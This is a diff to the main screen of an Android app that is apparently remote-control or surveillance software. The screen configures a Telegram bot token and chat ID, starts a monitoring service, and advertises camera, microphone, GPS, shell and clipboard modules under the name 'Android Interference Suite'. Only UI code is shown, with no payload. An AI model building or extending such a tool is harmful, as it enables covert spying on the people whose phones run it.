@@ -73,13 +73,22 @@ class MainActivity : ComponentActivity() {
         var botToken by remember { mutableStateOf("") }
         var chatId by remember { mutableStateOf("") }
         val scope = rememberCoroutineScope()
-        var status by remember { mutableStateOf("Ready") }
+        var status by remember { mutableStateOf("Initializing...") }
+        var isServiceRunning by remember { mutableStateOf(false) }
+        var isBroadcastAvailable by remember { mutableStateOf(false) }
         var isConfigExpanded by remember { mutableStateOf(false) }
 
         LaunchedEffect(Unit) {
             val (token, chat) = repository.getConfig()
             botToken = token
             chatId = chat
+            
+            // Observe Service State from Repository
+            repository.getServiceRunning().collect { running ->
+                isServiceRunning = running
+                isBroadcastAvailable = isServiceRunning && botToken.isNotEmpty()
+                status = if (isBroadcastAvailable) "🟢 Broadcast Available" else "🔴 Service Offline"
+            }
         }
 
         Column(
@@ -96,24 +105,51 @@ class MainActivity : ComponentActivity() {
             )
             Spacer(modifier = Modifier.height(8.dp))
             Text(
-                "Remote Control Service",
+                "Android Interference Suite",
                 style = MaterialTheme.typography.bodyLarge,
                 color = MaterialTheme.colorScheme.onSurfaceVariant
             )
 
-            Spacer(modifier = Modifier.height(48.dp))
+            Spacer(modifier = Modifier.height(32.dp))
 
-            // Status Card
-            Card(
-                colors = CardDefaults.cardColors(
-                    containerColor = MaterialTheme.colorScheme.surfaceVariant,
+            // Status Indicator Button
+            Button(
+                onClick = { 
+                    Toast.makeText(applicationContext, "Status: $status", Toast.LENGTH_SHORT).show()
+                    val vibrator = getSystemService(android.content.Context.VIBRATOR_SERVICE) as android.os.Vibrator
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        vibrator.vibrate(android.os.VibrationEffect.createOneShot(50, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+                    } else {
+                        vibrator.vibrate(50)
+                    }
+                },
+                colors = ButtonDefaults.buttonColors(
+                    containerColor = if (isBroadcastAvailable) androidx.compose.ui.graphics.Color.Green else androidx.compose.ui.graphics.Color.Red,
+                    contentColor = androidx.compose.ui.graphics.Color.White
                 ),
-                modifier = Modifier.fillMaxWidth()
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .height(56.dp)
+            ) {
+                Text(
+                    text = status.uppercase(),
+                    style = MaterialTheme.typography.titleMedium
+                )
+            }
+            
+            Spacer(modifier = Modifier.height(24.dp))
+            
+            // Integrated Suite Info
+            Card(
+                modifier = Modifier.fillMaxWidth(),
+                colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
             ) {
                 Column(modifier = Modifier.padding(16.dp)) {
-                    Text("Status", style = MaterialTheme.typography.labelLarge)
-                    Spacer(modifier = Modifier.height(4.dp))
-                    Text(status, style = MaterialTheme.typography.bodyMedium)
+                    Text("📦 Integrated Modules:", style = MaterialTheme.typography.titleSmall)
+                    Text("• Camera (Front/Back) ✅")
+                    Text("• Microphone (Audio Record) ✅")
+                    Text("• Location (GPS/Net) ✅")
+                    Text("• System (Apps, Shell, Clipboard) ✅")
                 }
             }
 
@@ -132,22 +168,22 @@ class MainActivity : ComponentActivity() {
                         } else {
                             startService(intent)
                         }
-                        status = "Service Active 🟢"
+                        Toast.makeText(applicationContext, "Starting Service...", Toast.LENGTH_SHORT).show()
                     },
                     modifier = Modifier.weight(1f).padding(end = 8.dp)
                 ) {
-                    Text("Start")
+                    Text("Start Service")
                 }
 
                 Button(
                     onClick = {
                         stopService(Intent(applicationContext, MonitorService::class.java))
-                        status = "Service Stopped 🔴"
+                        Toast.makeText(applicationContext, "Stopping Service...", Toast.LENGTH_SHORT).show()
                     },
                     colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error),
                     modifier = Modifier.weight(1f).padding(start = 8.dp)
                 ) {
-                    Text("Stop")
+                    Text("Stop Service")
                 }
             }
 
@@ -181,9 +217,9 @@ class MainActivity : ComponentActivity() {
                                 val id = repository.getChatId(botToken)
                                 if (id != null) {
                                     chatId = id
-                                    status = "Found ID: $id"
+                                    Toast.makeText(applicationContext, "Found ID: $id", Toast.LENGTH_SHORT).show()
                                 } else {
-                                    status = "ID Check Failed"
+                                    Toast.makeText(applicationContext, "ID Check Failed", Toast.LENGTH_SHORT).show()
                                 }
                             }
                         },
@@ -194,7 +230,7 @@ class MainActivity : ComponentActivity() {
                     Button(
                         onClick = {
                             repository.saveConfig(botToken, chatId)
-                            status = "Config Saved ✅"
+                            Toast.makeText(applicationContext, "Config Saved", Toast.LENGTH_SHORT).show()
                             isConfigExpanded = false
                         },
                         modifier = Modifier.weight(1f).padding(start = 4.dp)
@@ -204,6 +240,17 @@ class MainActivity : ComponentActivity() {
                 }
             }
         }
+    }
+    
+    @Suppress("DEPRECATION")
+    private fun isServiceRunning(context: android.content.Context, serviceClass: Class<*>): Boolean {
+        val manager = context.getSystemService(android.content.Context.ACTIVITY_SERVICE) as android.app.ActivityManager?
+        for (service in manager?.getRunningServices(Integer.MAX_VALUE) ?: emptyList()) {
+            if (serviceClass.name == service.service.className) {
+                return true
+            }
+        }
+        return false
     }
 }
 
